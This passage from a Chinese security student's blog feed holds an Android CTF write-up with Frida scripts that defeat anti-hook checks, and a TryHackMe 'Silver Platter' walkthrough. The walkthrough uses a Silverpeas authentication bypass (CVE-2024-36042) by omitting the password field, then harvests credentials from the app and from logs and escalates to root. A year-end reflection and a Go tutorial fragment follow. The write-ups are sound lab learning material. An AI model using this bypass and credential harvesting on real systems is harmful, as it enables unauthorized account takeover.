<span class="hljs-title function_">hook</span>();<br>    &#125;)<br>&#125;<br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>运行得出 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/5fe15c2bd9761773.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;f5d02d7eede3a75ee6e6cc0a9673c76f&#125;<br></code></pre></td></tr></table></figure><h1 id="Frida-检测之-inlineHook-level10"><a href="#Frida-检测之-inlineHook-level10" class="headerlink" title="Frida 检测之 inlineHook-level10"></a><strong>Frida 检测之 inlineHook</strong>-level10</h1><p>看 <code>native</code>  层的 <code>check</code> 函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/49f0f9abdb1a4e9a.png"></p><p>读取磁盘中 <code>libc.so</code> 文件 <code>signal</code> 函数的原始 8 字节数，获取内存中 <code>signal</code> 函数的实际代码比较二者是否一致，如果不一致程序就会退出，所以我们要模拟 <code>fread</code> 读取了预期数据，伪造返回值</p><p>获取 hook 前面的 8 个字节</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> bytes_count = <span class="hljs-number">8</span><br><span class="hljs-keyword">let</span> address = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">getExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;signal&quot;</span>)<br><span class="hljs-comment">//读取 signal 函数</span><br><br><span class="hljs-keyword">let</span> before = <span class="hljs-title function_">ptr</span>(address)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot; before hook: &quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(before, &#123;<br>    <span class="hljs-attr">offset</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">length</span>: bytes_count,<br>    <span class="hljs-attr">header</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">ansi</span>: <span class="hljs-literal">true</span><br>  &#125;));<br><br></code></pre></td></tr></table></figure><p>得出</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">e9 <span class="hljs-number">7</span>f f7 <span class="hljs-number">97</span> f4 <span class="hljs-number">83</span> e4 f0<br></code></pre></td></tr></table></figure><p>hook 脚本</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook_memcmp_addr</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-comment">//hook反调试</span><br>    <span class="hljs-keyword">var</span> memcmp_addr = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;fread&quot;</span>);<br>    <span class="hljs-keyword">if</span> (memcmp_addr !== <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;fread address: &quot;</span>, memcmp_addr);<br>        <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(memcmp_addr, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span> = args[<span class="hljs-number">0</span>];   <span class="hljs-comment">// 保存 buffer 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = args[<span class="hljs-number">1</span>];     <span class="hljs-comment">// 保存 size 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span> = args[<span class="hljs-number">2</span>];    <span class="hljs-comment">// 保存 count 参数</span><br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">stream</span> = args[<span class="hljs-number">3</span>];   <span class="hljs-comment">// 保存 FILE* 参数</span><br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>) &#123;<br>            <span class="hljs-comment">// 这里可以修改 buffer 的内容，假设我们知道何时 fread 被用于敏感操作</span><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>());<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>.<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">8</span>) &#123;<br>                <span class="hljs-comment">// 模拟 fread 读取了预期数据，伪造返回值</span><br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeByteArray</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>, [<span class="hljs-number">0xe9</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0xf0</span>]); <br>                retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">8</span>); <span class="hljs-comment">// 填充前8字节</span><br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hexdump</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">buffer</span>));<br>            &#125;<br>        &#125;<br>    &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Error: memcmp function not found in libc.so&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">hook_memcmp_addr</span>();<br>    <span class="hljs-keyword">var</span> targetAddress=<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>,<span class="hljs-string">&quot;strcmp&quot;</span>);<br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(targetAddress,&#123;<br>        <span class="hljs-attr">onEnter</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">args</span>)&#123;<br>            <span class="hljs-keyword">var</span> input =<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]);<br>            <span class="hljs-keyword">if</span> (input.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;FLAG:&quot;</span>+<span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]));<br>            &#125;<br>        &#125;,<span class="hljs-attr">onLeave</span>:<span class="hljs-keyword">function</span> (<span class="hljs-params">retval</span>)&#123;<br><br><br>        &#125;<br>    &#125;)<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span>=<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.swdd.summertrain.MainActivity&quot;</span>);<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivityInstance</span>=<span class="hljs-title class_">MainActivity</span>.$new();<br>    <span class="hljs-title class_">MainActivityInstance</span>.<span class="hljs-title class_">Check</span>(<span class="hljs-string">&quot;aaaaaaa&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-title function_">hook</span>();<br><br>    &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br><br></code></pre></td></tr></table></figure><p>得出 flag</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;a8490cd255d3a0a982fac16130183b76&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
      <category>Android题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Andriod</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>THM-Silver Platter</title>
    <link href="/2025/01/31/Platter/"/>
    <url>/2025/01/31/Platter/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap 扫一下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">159</span>.<span class="hljs-number">147</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c60ad30e212b87c6.png"></p><p>开放了 <code>22，80，8080</code> 端口，重点看看 <code>80</code>、<code>8080</code> 端口</p><h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>点击不同的页面时会在 “contact” 页面中看到一些有用的信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/0323fb05558d585c.png"></p><p>有一个叫 <strong><code>scr1ptkiddy</code></strong> 的用户名，并且有一个叫 <strong><code>Silverpeas</code></strong> 的东西。</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>访问进去发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">404 - Not Found<br></code></pre></td></tr></table></figure><p>扫描了一下目录</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//10.10.159.147:8080/</span><br></code></pre></td></tr></table></figure><p>没有有用的信息，尝试一番后在 <code>8080</code> 端口发现有一个 <code>silverpeas</code> 页面，是一个登录页面</p><h1 id="CVE-利用"><a href="#CVE-利用" class="headerlink" title="CVE 利用"></a>CVE 利用</h1><p>最开始尝试了爆破，后来发现不现实，于是去搜了看有没有什么漏洞，在 GitHub 上发现了关于 Silverpeas 的 CVE：CVE-2024-36042，一个身份验证绕过漏洞，<a href="https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d%E3%80%82">https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d。</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;Password=111&amp;DomainId=0<br>-&gt; <span class="hljs-attribute">Login</span>=scr1ptkiddy&amp;DomainId=0<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f52af2a087f0fa6e.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/04502533f67ea345.png"></p><p>登录成功！</p><h1 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h1><p>进去之后找了一圈也没发现啥一样的东西，不过可以看到有 3 个用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/ca968e98819c6e7a.png"></p><p>挨个用身份验证绕过漏洞去尝试其余两个用户，最后成功登上了 <code>Manager</code> 账户</p><p><img src="https://img.dkdun.cn/v1/2025/12/bf1681240b4dfe6d.png"></p><p>发现了 ssh 登陆凭证</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">Username: tim<br><br>Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/49e8ce2eacc5f759.png"></p><p>通过 ssh 成功登录获取到 user flag</p><h1 id="简单提权"><a href="#简单提权" class="headerlink" title="简单提权"></a>简单提权</h1><p>查看 <code>/etc/passwd</code> 目录，发现还有一个 <code>tyler</code> 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/home$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:104::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>pollinate:x:105:1::/var/cache/pollinate:/bin/false<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>syslog:x:107:113::/home/syslog:/usr/sbin/nologin<br>uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin<br>tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false<br>landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin<br>fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>tyler:x:1000:1000:root:/home/tyler:/bin/bash<br>lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false<br>tim:x:1001:1001::/home/tim:/bin/bash<br>dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler:x:1000:1000:root:/home/tyler:/bin/bash<br></code></pre></td></tr></table></figure><p>没办法提权，来看看日志，终于在我一条一条看看了很久之后找到了有用的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dec 13 15:40:33 silver-platter <span class="hljs-built_in">sudo</span>:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3<br></code></pre></td></tr></table></figure><p>看到了<code>password:_Zd_zx7N823/</code></p><p>直接用 su 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tim@silver-platter:/var/log$ su tyler<br>Password:<br>tyler@silver-platter:/var/log$ <span class="hljs-built_in">id</span><br>uid=1000(tyler) gid=1000(tyler) <span class="hljs-built_in">groups</span>=1000(tyler),4(adm),24(cdrom),27(<span class="hljs-built_in">sudo</span>),30(dip),46(plugdev),110(lxd)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> -l<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> tyler:<br>Matching Defaults entries <span class="hljs-keyword">for</span> tyler on silver-platter:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User tyler may run the following commands on silver-platter:<br>    (ALL : ALL) ALL<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /home<br>tyler@silver-platter:/home$ <span class="hljs-built_in">ls</span><br>tim  tyler<br>tyler@silver-platter:/home$ <span class="hljs-built_in">cd</span> tyler<br>tyler@silver-platter:~$ <span class="hljs-built_in">cd</span> /root<br>bash: <span class="hljs-built_in">cd</span>: /root: Permission denied<br></code></pre></td></tr></table></figure><p>输出了 <code>Permission denied</code>，权限还是不够，发现 <code>User tyler may run the following commands on silver-platter:     (ALL : ALL) ALL</code>，所以直接试试 <code>sudo su</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tyler@silver-platter:~$ <span class="hljs-built_in">sudo</span> su<br>root@silver-platter:/home/tyler# <span class="hljs-built_in">cd</span> /root<br>root@silver-platter:~# <span class="hljs-built_in">ls</span><br>root.txt  snap  start_docker_containers.sh<br>root@silver-platter:~# <span class="hljs-built_in">cat</span> root.txt<br>THM&#123;098f6bcd4621d373cade4e832627b4f6&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f3a65c8f8cf6b607.png"></p><p>拿到 root flag</p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>THM 渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 年总结</title>
    <link href="/2025/01/28/2024%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/28/2024%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>虽然没有什么成绩，但也算是成长了一年，新年快乐！</p><span id="more"></span><p>​        忽然之间，曾以为遥远的2025也要到来了，以前从来没有写过年度总结，因为一直觉得自己不是一个成功的人，看着那些优秀的师傅们洋洋洒洒地写下他们的辉煌的战绩，发现自己很难定义这一年真正拥有过什么，收获了什么，就觉得昏昏沉沉的一年就又要过去了。但是 N1nEmAn 师傅说：写年终总结想写就写吧，哪有那么多成功。于是我坐在房间里写下这段话。</p><p>​大一上的时候也学过一些前端、算法，但是学着学着发现我不喜欢，我的确对它们产生不了兴趣，锐评一下：枯燥＋没意思。当时寒假也想着做个动态网站出来，可是最终还是没有产出，遂放弃。大一下开学了，很轻松，突然在五月的某一天开始思考自己到底要学什么，其实非常感谢学长学姐们给了我很多点拨，让我知道了更多信息。</p><p>​六月开始听着学长的建议开始看网络基础（但是感觉自己有一种三天打鱼两天晒网的情况qwq），看了没多久就因为期末周搁置了。暑假开始，因为算法培训留校了两周（其实就是为了留校，我并不想上算法课www），当时想学逆向，按照学姐的建议学习了汇编，嗯…感觉也学的不精。留校期间有幸经过学长推荐打了当时大二拔尖班的内部赛（这算是我打的第一场 CTF比赛wow），CTF也是染上了hhhhhh。</p><p>​回家之后继续看基础，随之而来的有很多新生赛，BaseCTF、MoeCTF 等等（怎么会有这么多新生赛！！！），一边学一边打，太菜了，一个暑假过去才只能做简单题qwq，但是认识了好多厉害的师傅！</p><p>​开学之后也在学，要学的太多了，突然步入了迷茫阶段，感觉大学好短，想学的很多，但是我好像就是很笨，就是学不会，别人一眼就能看出来原理甚至脱口而出答案的东西而我看答案都看不懂。大家都好厉害，我很羡慕认识的这些师傅们可以打比赛，可以拿奖，自己属于是卷又卷不赢，躺又躺不平。每天都在破防当中，是做题时代码分析不出来的破防，是问别的师傅题时听不懂的破防，是看题解时看不明白的破防，是复现不出来的破防，每天不是在破防就是在破防的路上，我常常想，要是我能更聪明一点、更厉害一点就好了。有时候在回宿舍的楼梯间碰见认识的人会被感慨一句学这么晚才回来啊。其实我也不想学这么久，每次回寝室的路上一个人都没有，我也想看一眼就懂，不花费这么多时间。白天几乎满课，真正能静下心来学习的时候很少，想多看一点，有时候甚至都不想回寝室睡觉了。好在夜晚能吹着凉爽的风，也算是平淡生活里的慰藉。</p><p>​九月底通过一个在阿里工作的学长了解到逆向确实不好找工作（学得厉害才行），在经过很久的思想斗争之后决定转向 web，十月开始学习 web，幸运的是有学长带着我，学了一些基础漏洞和挖漏洞技巧，CTF 的 web 方向的题慢慢能做一些了，然后对此产生了兴趣！但是还是感觉自己像半吊子呜呜呜呜呜。</p><p>​十一月开始就慢慢结课，开始复习考试，学习的时间就变得更少了，值得开心的是我搭好了自己的博客跟很多厉害的师傅们加了友链，并且立下 flag 三天更一篇（其实并没有 cat 到呜呜呜呜呜）。</p><p>​十二月，这个月更是重量级，几乎每周都有考试，这个月是一点没学，但是打了国赛（差点进线下，唉遗憾，但还是感谢学长们带我打这么大的比赛），有幸被邀请成为了 RDCTF 的出题人，太菜了只能出签到题和简单题qwq。</p><p>​月底考完 Java 后刚好有几天空闲时间，于是去了一趟北京。这趟北京之旅是人生中不能忘记的体验，领略到了北平的冬，打卡了很多地方吃了很多特色美食，站在什刹海边吹着风不禁想起了赵雷《鼓楼》中的那句歌词：我站在什刹海边，一切的甜蜜都与我无关，这是个拥挤的地方。体验到了人生中的第一场滑雪，南方孩子狂喜！还去逛了清华和北大，去到了北大的未名湖畔，在清华亲眼看到了曾经激励我的那句话：“我可以告诉你当年我也一样郁闷吗？”，肉眼可见他们的精神风貌真的与我们不一样，他们自信昂扬充满激情，图书馆里、教学楼里、楼道里甚至食堂里面都充满了他们学习的身影，高等学府浓厚的学术氛围着实让人羡慕。在天安门排了 13 个小时的队吹了一夜的冷风，终于站在第一排看着冉冉升起的五星红旗迎接 2025 第一个晨曦，军乐队、和平鸽都很幸运地见到了，现场特别震撼，大家都特别激动，拍了很多照片和视频（起码拍了几百张hhhhhhh），运气真的很好，第一次来看升旗就站到了第一排owo。从来没想过小时候只能在电视里见到的首都自己能在 18 岁时踏足于此。</p><p>​快乐是短暂的，回学校的第二天就是考试，等着我的是 4 门考试＋IT 实习呜呜呜呜呜，谁家学校一学期考12 门啊啊啊啊啊啊（被信息安全概论背刺了居然还考栈溢出⊙﹏⊙），数据通信我爱你呜呜呜呜呜。</p><p>​寒假以 CTF 开始（oh，no 戒不掉了），然后开始从零开始的渗透之路（需要学的好多但是好有趣wuw）和挖洞（到底怎样才能自己挖到哇qwq）。打了西湖论剑（爆零了）和春秋杯（坐牢），在某天晚上心血来潮又开始学 go 语言，gogogo！大出血买了人生中第一台相机，LUMIX，好喜欢！。</p><p>​这一年差不多就这样结束了，感觉自己很幸运，遇到了很多很好的人，跟厉害的师傅们也交流过好多，有问题的时候大家都会毫不吝啬地为我提供帮助，真的非常非常非常非常非常非常感谢师傅们（＾～＾）（90°鞠躬）。马上就是大年初一了，真正意义上的新的一年，今年的坎坷，是为了明年更好的相遇，“何时葡萄先熟透 你要静候再静候”（感觉自己变得佛系了hhhhh）。渐渐地我也明白只有自己才是最珍贵的，人各有各，不过尔尔。希望未来的我能拥有一颗像乌萨奇一样坚强、稳定、勇敢的心和乐观的心态，2025，要像师父说的那样：新的一年技术更上一层楼！坚定自信更努力地继续向前奔跑，去成为一个真正厉害的人。</p><p><img src="https://img.dkdun.cn/v1/2025/12/93096e631b884738.png"></p>]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:从零开始的 Go 之旅-数据类型&amp;常量&amp;变量&amp;输入输出</title>
    <link href="/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/01/22/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<p>部分内容和 C 语言的是一样的，所以就只记了不一样的</p><span id="more"></span><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-type">byte</span>等价 <span class="hljs-type">uint8</span> 可以表达 ASCII 字符<br><span class="hljs-type">rune</span>等价 <span class="hljs-type">int32</span> 可以表达 Unicode 字符<br><span class="hljs-type">string</span>字符串即字节序列，可以转化为 []<span class="hljs-type">byte</span> 类型即字节切片<br></code></pre></td></tr></table></figure><h2 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">数组[<span class="hljs-number">1</span>]<span class="hljs-type">int</span>长度为 <span class="hljs-number">1</span> 的整型数组<br>切片[]<span class="hljs-type">float64</span><span class="hljs-number">64</span>位浮点数切片<br>映射表<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>键为字符串,值为整型的映射表<br>结构体<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">struct</span>&#123;&#125;Gopher 结构体<br>指针*<span class="hljs-type">int</span><br>函数<span class="hljs-keyword">type</span> f <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>无参无返回值的函数<br>接口<span class="hljs-keyword">type</span> Gopher <span class="hljs-keyword">interface</span>&#123;&#125;Gopher 接口<br>通道<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>整型通道<br></code></pre></td></tr></table></figure><h2 id="零值"><a href="#零值" class="headerlink" title="零值"></a>零值</h2><p>零值又称为 <code>zero 